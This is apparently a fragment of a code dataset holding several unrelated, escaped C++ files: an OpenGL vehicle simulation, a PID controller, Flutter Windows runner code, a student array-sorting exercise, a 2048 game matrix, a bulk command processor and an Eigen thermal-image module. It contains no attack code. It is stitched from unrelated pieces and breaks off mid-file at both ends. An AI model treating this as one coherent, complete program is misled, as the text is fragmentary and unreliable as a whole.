vehicle_speedY;\n\tdouble vehicle_posX;\n\tdouble vehicle_posY;\n\tchar orientation;\n\tbool direction;\n\n} vehicle[14];\n\ndouble car_speedX;\ndouble car_speedY;\ndouble car_posX;\ndouble car_posY;\n\nvoid speed_shuffle(){\t\t\t//for shuffling the speed of the vehicles.\n\tdouble d=0.005;\n\tfor(int i=1;i<=no_of_vehicle;i++){\n\t\tspeeds.p_b(d);\n\t\td+=0.005;\t\n\t}\n\trandom_shuffle(all(speeds));\t\t\n}\n\nvoid shuffle_directions(){\t\t//for assigning the directions and orientations to the vehicles. \n\tsrand(time(0));\n\tfor(int i=1;i<=no_of_vehicle;i++){\n\t\tif(i<=8){\n\t\t\torientations.p_b('V');\n\t\t\tif(i%2)\n\t\t\t\tdirections.p_b(1);\n\t\t\telse\n\t\t\t\tdirections.p_b(0);\n\t\t}\n\t\telse{\n\t\t\torientations.p_b('H');\n\t\t\tif(i%2)\n\t\t\t\tdirections.p_b(1);\n\t\t\telse\n\t\t\t\tdirections.p_b(0);\n\t\t}\t\n\t}\n}\n\nvoid color_shuffle(){\t\t//for shuffling the color of the vehicles.\n\tsrand(time(0));\n\tfor(int i=0;i<no_of_vehicle;i++){\n\t\tcolors[i][0]=(rand()%10)*1.0/10;\n\t\tcolors[i][1]=(rand()%10)*1.0/10;\n\t\tcolors[i][2]=(rand()%10)*1.0/10;\n\t}\n}\n\nvoid assign_positions(){\t\t//for assigning the positions to the vehicles.\n\tsrand(time(0));\n\tint j;\n\tchar k;\n\thor_left.push(ver_gap+0.5*road_width-10);\n\thor_left.push(ver_gap+1.5*road_width+ver_road_gap-10);\n\thor_left.push(ver_gap+2.5*road_width+2*ver_road_gap-10);\n\n\thor_right.push(ver_gap+0.5*road_width+10);\n\thor_right.push(ver_gap+1.5*road_width+ver_road_gap+10);\n\thor_right.push(ver_gap+2.5*road_width+2*ver_road_gap+10);\n\n\tver_up.push(hor_gap+10);\n\tver_up.push(hor_gap+road_width+hor_road_gap+10);\n\tver_up.push(hor_gap+2*road_width+2*hor_road_gap+10);\n\tver_up.push(hor_gap+3*road_width+3*hor_road_gap+10);\n\n\tver_down.push(hor_gap+0.5*road_width+10);\n\tver_down.push(hor_gap+1.5*road_width+hor_road_gap+10);\n\tver_down.push(hor_gap+2.5*road_width+2*hor_road_gap+10);\n\tver_down.push(hor_gap+3.5*road_width+3*hor_road_gap+10);\n\n\tfor(int i=0;i<no_of_vehicle;i++){\n\n\t\tj=directions[i];\n\t\tk=orientations[i];\n\t\t\n\t\tvehicle[i].direction=j;\n\t\tvehicle[i].orientation=k;\n\n\t\tif(k=='H'&&j==0){\n\t\t\tvehicle[i].vehicle_posY=hor_left.front();\n\t\t\tvehicle[i].vehicle_posX=rand()%width;\n\t\t\thor_left.pop();\n\t\t}\n\t\telse if(k=='H'&&j==1){\n\t\t\tvehicle[i].vehicle_posY=hor_right.front();\n\t\t\tvehicle[i].vehicle_posX=rand()%width;\n\t\t\thor_right.pop();\n\t\t}\n\t\telse if(k=='V'&&j==0){\n\t\t\tvehicle[i].vehicle_posX=ver_down.front();\n\t\t\tvehicle[i].vehicle_posY=rand()%height;\n\t\t\tver_down.pop();\n\t\t}\n\t\telse if(k=='V'&&j==1){\n\t\t\tvehicle[i].vehicle_posX=ver_up.front();\n\t\t\tvehicle[i].vehicle_posY=rand()%height;\n\t\t\tver_up.pop();\n\t\t}\n\t}\t\n}\n\nvoid draw_vehicles(){\t\t//for drawing the vehicles.\n\t\n\tfor(int i=0;i<no_of_vehicle;i++){\n\t\tglColor3f(colors[i][0],colors[i][1],colors[i][2]);\n\n\t\tif(vehicle[i].orientation=='H'&&vehicle[i].direction==0){\n\t\t\tglPushMatrix();\n\t\t\t\tglBegin(GL_POLYGON);\n\t\t\t\t\tglVertex2f(vehicle[i].vehicle_posX,vehicle[i].vehicle_posY);\n\t\t\t\t\tglVertex2f(vehicle[i].vehicle_posX,vehicle[i].vehicle_posY-40);\n\t\t\t\t\tglVertex2f(vehicle[i].vehicle_posX-65,vehicle[i].vehicle_posY-40);\n\t\t\t\t\tglVertex2f(vehicle[i].vehicle_posX-90,vehicle[i].vehicle_posY-20);\n\t\t\t\t\tglVertex2f(vehicle[i].vehicle_posX-65,vehicle[i].vehicle_posY);\n\t\t\t\tglEnd();\n\t\t\tglPopMatrix();\n\t\t}\n\t\telse if(vehicle[i].orientation=='H'&&vehicle[i].direction==1){\n\t\t\tglPushMatrix();\n\t\t\t\tglBegin(GL_POLYGON);\n\t\t\t\t\tglVertex2f(vehicle[i].vehicle_posX,vehicle[i].vehicl",
    "/*\n * Copyright 2019 Bradley J. Snyder <snyder.bradleyj@gmail.com>\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\n\n#include \"cpid.h\"\n#include <iostream>\n#include <cmath>\n\nusing namespace std;\n\nCPID::CPID( double dt, double max, double min, double Kp, double Kd, double Ki )\n{\n    pimpl = new CPIDImpl(dt,max,min,Kp,Kd,Ki);\n}\n\nCPID::~CPID()\n{\n    delete pimpl;\n}\n\ndouble CPID::calculate( double setpoint, double pv )\n{\n    return pimpl->calculate(setpoint,pv);\n}\n\n\nCPIDImpl::CPIDImpl( double dt, double max, double min, double Kp, double Kd, double Ki ) :\n    _dt(dt),\n    _max(max),\n    _min(min),\n    _Kp(Kp),\n    _Kd(Kd),\n    _Ki(Ki),\n    _pre_error(0),\n    _integral(0)\n{\n}\n\nCPIDImpl::~CPIDImpl()\n{\n}\n\ndouble CPIDImpl::calculate( double setpoint, double pv )\n{\n\n    // Calculate error\n    double error = setpoint - pv;\n\n    // Proportional term\n    double Pout = _Kp * error;\n\n    // Integral term\n    _integral += error * _dt;\n    double Iout = _Ki * _integral;\n\n    // Derivative term\n    double derivative = (error - _pre_error) / _dt;\n    double Dout = _Kd * derivative;\n\n    // Calculate total output\n    double output = Pout + Iout + Dout;\n\n    // Restrict to max/min\n    if( output > _max )\n        output = _max;\n    else if( output < _min )\n        output = _min;\n\n    // Save error to previous error\n    _pre_error = error;\n\n    return output;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\nusing namespace std;\n//Mustafa Eldikan----- Student No: 1306210108-----16.05.2022 #Assignment (2)\n\nint main() {\n\tint const size = 10;\n\tint Array[size] = {0};\n\tint* Ptr = Array;\n\tint temp = 0;\n\t\n\tcout << \"Please enter ten numbers...\" << endl;\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\tcin >> Array[i];\n\t}\n\n\n\tcout << \"Array's elements is : \" << endl;\n\n\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\tcout << Array[i] << \" , \";\n\n\t}\n\tcout << endl;\n\tcout << \"----------------------------\" << endl;\n\n\tcout << \"Before sorting array ...: \" << endl;\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\tcout << *(Ptr + i) << \" , \";\n\t}\n\tcout << endl;\n\tcout << \"----------------------------\" << endl;\n\n\tcout << \"After sorting array ...: \" << endl;\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\t\n\t\tfor (int j = i+1; j < size; j++)\n\t\t{\n\t\t\tif (*(Ptr + i) < *(Ptr + j))\n\t\t\t{\n\t\t\t\ttemp = *(Ptr+i);\n\t\t\t\t*(Ptr+i) = *(Ptr+j);\n\t\t\t\t*(Ptr + j) = temp;\n\n\t\t\t}\n\t\t\t\n\t\t}\n\t}\n\tfor (int i= 0; i < size; i++)\n\t{\n\t\tcout << *(Ptr + i) << \" , \";\n\t}\n\tcout << endl;\n\n\treturn 0;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "//\n// Created by caowei on 2024/4/29.\n//\n\n#include \"game_matrix.h\"\n#include <iostream>\n#include <iomanip>\n\nusing namespace std;\n\n// \u521d\u59cb\u5316\nMatrix2048::Matrix2048() {\n    // \u5b9a\u4e49\u521d\u59cb\u5316\n    this->matrix;\n    this->size = 0;\n    this->record = 0;\n}\nMatrix2048::Matrix2048(int size, int num) {\n    // \u7b80\u5355\u521d\u59cb\u5316\n    this->size = size;\n    this->record = 0;\n    for (int i = 0; i < this->size; ++i) {\n        this->matrix.emplace_back(this->size, num);\n    }\n}\nMatrix2048::Matrix2048(std::vector<std::vector<int>> initMat) {\n    // \u542b\u53c2\u521d\u59cb\u5316\n    this->matrix = initMat;\n    this->size = this->matrix.size();\n    this->record = 0;\n}\nvoid Matrix2048::zeros(int size) {\n    this->size = size;\n    this->matrix = {};\n    for (int i = 0; i < this->size; ++i) {\n        this->matrix.emplace_back(this->size, 0);\n    }\n}\n\n// \u4fe1\u606f\u67e5\u770b\nvoid Matrix2048::showMat() {\n    // \u6253\u5370\u77e9\u9635\n    string eleLineSpe = \" -----\";\n    string lineSpe = \"\";\n    for (int i = 0; i < this->size; ++i) {\n        lineSpe += eleLineSpe;\n    }\n    for (auto row : this->matrix) {\n        cout << lineSpe << endl;\n        for (auto num : row) {\n            cout << '|' << setw(5) << num;\n        }\n        cout << '|' << endl;\n    }\n    cout << lineSpe << endl;\n}\nint Matrix2048::getSize() const {\n    return this->size;\n}\nint Matrix2048::getRecord() const {\n    return this->record;\n}\nstd::vector<int> Matrix2048::operator()(int x) const {\n    return this->matrix[x];\n}\nint Matrix2048::operator()(int x, int y) const {\n    return this->matrix[x][y];\n}\nstd::vector<std::vector<int>> Matrix2048::getMatrix() {\n    return this->matrix;\n}\nstd::vector<Point> Matrix2048::ZerosInd() {\n    // \u83b7\u53d6\u503c\u4e3a\u96f6\u7684\u5750\u6807\u6570\u7ec4\n    vector<Point> emptyPos;\n    for (int row = 0; row < this->size; ++row) {\n        for (int col = 0; col < this->size; ++col) {\n            if (this->matrix[row][col] == 0) {\n                emptyPos.push_back({row, col});\n            }\n        }\n    }\n    return emptyPos;\n}\nbool Matrix2048::checkMove() {\n    return this->moveFlag;\n}\n\n// \u8d4b\u503c\u64cd\u4f5c\nvoid Matrix2048::setVal(int x, int y, int val) {\n    this->matrix[x][y] = val;\n}\nvoid Matrix2048::setVal(int x, std::vector<int> val) {\n    this->matrix[x] = val;\n}\nvoid Matrix2048::resetMoveFlag() {\n    this->moveFlag = false;\n}\n\n// \u65b9\u9635\u987a\u65f6\u9488\u65cb\u8f6c90\u00b0\nvoid Matrix2048::RotateClockWise() {\n    int n = this->matrix.size();\n    auto tmpMat = this->matrix;\n    for (int i = 0; i < n; ++i) {\n        for (int j = 0; j < n; ++j) {\n            tmpMat[j][n-1-i] = this->matrix[i][j];\n        }\n    }\n    this->matrix = tmpMat;\n}\n// \u65b9\u9635\u9006\u65f6\u9488\u65cb\u8f6c90\u00b0\nvoid Matrix2048::RotateCounterClockWise () {\n    int n = this->matrix.size();\n    auto tmpMat = this->matrix;\n    for (int i = 0; i < n; ++i) {\n        for (int j = 0; j < n; ++j) {\n            tmpMat[n-1-j][i] = this->matrix[i][j];\n        }\n    }\n    this->matrix = tmpMat;\n}\n// \u77e9\u9635\u5de6\u79fb\nvoid Matrix2048::MoveLeft() {\n    this->moveFlag = false;\n    for (int row = 0; row < this->size; ++row) {\n        std::vector<bool> merged(this->size, false);    // \u8bb0\u5f55\u8be5\u884c\u6bcf\u683c\u53c2\u4e0e\u5408\u6210\u4e0e\u5426\n        for (int col = 1; col < this->size; ++col) {\n            // \u56e0\u4e3a\u7b2c\u4e00\u5217\u4e00\u5b9a\u4e0d\u4f1a\u52a8\uff0c\u6240\u4ee5\u4e0d\u4ece\u7b2c\u4e00\u5217\u5f00\u59cb\u904d\u5386\n            if (this->matrix[row][col] == 0)\n                // \u82e5\u8be5\u6570\u4e3a\u96f6\uff0c\u5219\u8df3\u8fc7\uff0c\u4e0d\u8fdb\u884c\u64cd\u4f5c\n                continue;\n            for (int i = col-1; i >= 0; --i) {\n                // \u82e5\u8be5\u6570\u5de6\u8fb9\u4e3a\u96f6\uff0c\u5219\u5de6\u79fb\n                if (this->matrix[row][i] == 0) {\n                    this->matrix[row][i] = this->matrix[row][i+1];\n                    this->matrix[row][i+1] = 0;\n                    this->moveFlag = true;\n                }\n                    // \u82e5\u8be5\u6570\u4e0e\u5de6\u8fb9\u76f8\u7b49\uff0c\u4e14\u4e24\u6570\u5728\u672c\u8f6e\u64cd\u4f5c\u4e2d\u90fd\u672a\u53c2\u4e0e\u5408\u6210\uff0c\u5219\u5411\u5de6\u5408\u5e76\n                else if (!merged[i] && !merged[i+1] && this->matrix[row][i] == this->matrix[row][i+1]) {\n                    this->matrix[row][i] += this->matrix[row][i+1];\n                    this->matrix[row][i+1] = 0;\n                    merged[i] = true;\n                    this->record += this->matrix[row][i];\n                    this->moveFlag = true;\n                }\n                    // \u5426\u5219\u7ed3\u675f\u8be5\u6570\u7684\u79fb\u52a8\n                else\n                    break;\n            }\n        }\n    }\n}\n// \u77e9\u9635\u4e0a\u79fb\nvoid Matrix2048::MoveUp() {\n    this->RotateCounterClockWise();\n    this->MoveLeft();\n    this->RotateClockWise();\n}\n// \u77e9\u9635\u53f3\u79fb\nvoid Matrix2048::MoveRight() {\n    this->RotateCounterClockWise();\n    this->RotateCounterClockWise();\n    this->MoveLeft();\n    this->RotateClockWise();\n    this->RotateClockWise();\n}\n// \u77e9\u9635\u4e0b\u79fb\nvoid Matrix2048::MoveDown() {\n    this->RotateClockWise();\n    this->MoveLeft();\n    this->RotateCounterClockWise();\n}\n",
    "// Copyright 2014 The Flutter Authors. All rights reserved.\n// Use of this source code is governed by a BSD-style license that can be\n// found in the LICENSE file.\n\n#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n    FreeLibrary(user32_module);\n  }\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n      ",
    "/// @brief This module contains command processing\r\n/// and the main function\r\n\r\n#include \"model.h\"\r\n#include \"inout.h\"\r\n#include <utility>\r\n#include <stack>\r\n\r\n/// @brief A type for lexemas: Enum + string\r\nusing lexema_t = std::pair<enum Lex, std::string>;\r\n\r\n/// @brief The command stack\r\n/// is used here for convenient creation and deletion of command blocks\r\n/// stack depth is <= 1\r\nusing bulks_t = std::stack<bulk_t>;\r\n\r\n/// @brief Global variable for size of \"static\" bulks\r\nint bulk_size = 0;\r\n\r\n/// @brief Returns next lexema from input\r\n/// @return std::pair<enum Lex, std::string>\r\nlexema_t next_lexema()\r\n{\r\n    std::string buf;\r\n\r\n    c_get_line(buf);\r\n\r\n    if (c_eof())\r\n        return std::make_pair(EndOfInput, std::string(\"\"));\r\n    if (buf.find('{') != buf.npos)\r\n        return std::make_pair(OpenBr, std::string(\"{\"));\r\n    if (buf.find('}') != buf.npos)\r\n        return std::make_pair(CloseBr, std::string(\"}\"));\r\n    return std::make_pair(Cmd, buf);\r\n}\r\n\r\n/// @brief The main automate to process commands\r\n/// @param bulks - one level stack of command bulks\r\nvoid proceed(bulks_t &bulks)\r\n{\r\n    // Set initial state\r\n    bulks.push(bulk_t(clock(), StartOfStatic, bulk_size));\r\n    int is_dynamic = 0;\r\n\r\n    while (true)\r\n    {\r\n        auto lexema = next_lexema();\r\n        int lexlex = lexema.first; // first: lexema enum,\r\n                                   // second: command string, if any, or \"\"\r\n\r\n        switch (lexlex)\r\n        {\r\n        case OpenBr:          // '{'\r\n            if (is_dynamic++) // nested '{' are only accounted\r\n                break;\r\n            output_bulk(bulks.top());\r\n\r\n            // destroys the old cmd bulk\r\n            bulks.pop();\r\n\r\n            // Creates & constructs new cmd bulk header\r\n            bulks.push(bulk_t(clock(), OpenBr, 0));\r\n            break;\r\n        case CloseBr:         // '}'\r\n            if (--is_dynamic) // checks for nesting level\r\n                break;\r\n            output_bulk(bulks.top());\r\n            bulks.pop();\r\n            bulks.push(bulk_t(clock(), StartOfStatic, bulk_size));\r\n            break;\r\n        case Cmd: // command\r\n            bulks.top().cmds.emplace_back(lexema.second);\r\n\r\n            // for dynamic bulks target_size is 0, for static ones - is equal to bulk_size\r\n            if (bulks.top().cmds.size() == bulks.top().target_size)\r\n            {\r\n                output_bulk(bulks.top());\r\n                bulks.pop();\r\n                bulks.push(bulk_t(clock(), StartOfStatic, bulk_size));\r\n            }\r\n            break;\r\n        case EndOfInput: // ^D\r\n            if (bulks.top().lex == OpenBr)\r\n                return;\r\n            output_bulk(bulks.top());\r\n            return;\r\n        };\r\n    }\r\n}\r\n\r\n/// @brief Just a main proc\r\n/// @param argc is not used, because the param number is known to be 1\r\n/// @param argv nof commands in a bulk, is stored into a global var bulk_size\r\n/// @return zero\r\nint main([[maybe_unused]] int argc, char *argv[])\r\n{\r\n    bulks_t bulks;\r\n    bulk_size = std::atoi(argv[1]);\r\n    proceed(bulks);\r\n    return 0;\r\n}",
    "/*\n * mtxCV.cpp\n *\n *  Created on: Apr 7, 2024\n *      Author: ace janssen-rich\n */\n\n/* printf REFERENCE:\n    %c\tcharacter\n    %d\tdecimal (integer) number (base 10)\n    %e\texponential floating-point number\n    %f\tfloating-point number\n    %i\tinteger (base 10)\n    %o\toctal number (base 8)\n    %s\ta string of characters\n    %u\tunsigned decimal (integer) number\n    %x\tnumber in hexadecimal (base 16)\n    %%\tprint a percent sign\n    \\%\tprint a percent sign\nNOTE on ImageType template:\ntemplate<typename MatrixType>\nvoid exampleFunction(MatrixType& image) {\n    //Cast to type associated with MatrixType:\n    image(jRow, iCol) = static_cast<typename MatrixType::Scalar>(xyz);\n\n    //Cast MatrixType element to type\n    float varFloat = static_cast<float>(image(jRow, iCol));\n\n    //Cast entire image matrix to type\n    MatrixXf mtxFloat = image.template cast<float>();\n\n    //convert data type without copying the matrix using map (changes to one matrix are reflected in the other)\n    MatrixXf mappedImage(image.rows(), image.cols());\n    mappedImage = Map<MatrixXf>(image.data(), image.rows(), image.cols());\n\n// Checking MatrixType data type and structure\n    <<Specific DataType>> if constexpr(std::is_same<typename MatrixType::Scalar, float>::value) {} //see std template: is_same<T, T>:std::true_type {};\n    <<float, double etc>> if constexpr(std::is_floating_point<typename MatrixType::Scalar>::value) {}\n    <<all signed and unsigned integer types>> if constexpr(std::is_integral<typename MatrixType::Scalar>::value) {}\n    <<all signed integer types>> if constexpr(std::is_signed<typename MatrixType::Scalar>::value) {}\n    <<all unsigned integer types>> if constexpr(std::is_unsigned<typename MatrixType::Scalar>::value) {}\n    <<type is Matrix>> if constexpr(Eigen::is_matrix<MatrixType>::value) {}\n    <<type is Array>> if constexpr(Eigen::is_array<MatrixType>::value) {}\n    <<type is Vector>> if constexpr(Eigen::is_vector<MatrixType>::value) {}\n\n Use constexpr variable declaration to flag value to be computed at compile time.\n}\n\n+++++++++++++ EXAMPLE IMG ROTATIONS +++++++++++++ //\n    //FLIP VERTICAL\n    thermalImg.rowwise().reverseInPlace();\n\n    //FLIP HORIZONTAL\n    thermalImg.colwise().reverseInPlace();\n\n    //ROTATE CCW 90 degrees\n    thermalImg.transposeInPlace();\n    thermalImg.colwise().reverseInPlace();\n\n    //ROTATE CW 90 degrees\n    thermalImg.transposeInPlace();\n    thermalImg.rowwise().reverseInPlace();\n+++++++++++++ NEXT SECTION +++++++++++++ //\n*/\n\t#include \"mtxCV.h\"\n\n\n\t// Example data structure for MLX90640 sensor image output for testing // TBD remove, temp fixed image frame for debug testing\n//\tconst float MtxCV::thermalImageArr[768] = {0.497f, 0.f, 0.1f, 0.1f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f,\n//\t0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 6.497f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 1.624f, 0.f, 0.f, 6.497f, 0.f, 0.f, 0.f, 1.624f, 0.f, 0.f, 0.f, 0.f,\n//\t1.624f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 1.624f, 0.f, 0.f, 0.f, 1.624f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 6.497f, 0.f,\n//\t0.f, 1.624f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 6.497f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 1.624f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f,\n//\t0.f, 6.497f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 